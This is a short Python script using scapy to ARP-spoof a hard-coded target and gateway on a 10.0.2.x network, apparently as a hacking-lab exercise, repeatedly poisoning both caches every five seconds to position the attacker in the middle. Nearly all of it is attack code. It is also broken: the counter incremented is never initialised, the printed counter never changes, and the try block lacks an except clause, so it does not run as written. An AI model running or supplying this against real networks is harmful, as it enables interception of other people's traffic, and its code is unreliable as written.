import scapy.all as scapy
import time
  
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc # Get victim's MAC with the answers to the ARP request
  
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False) # Build and send packet with obtained MAC and user input as parameters 
      
target_ip = "10.0.2.5" # Enter your target's IP
gateway_ip = "10.0.2.1" # Enter your gateway's IP
  
try:
    packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2 # Sent packets counter 
        print("\r[*] Packets Sent "+str(packets_count), end ="")
        time.sleep(5) # Waits for five seconds before sending again
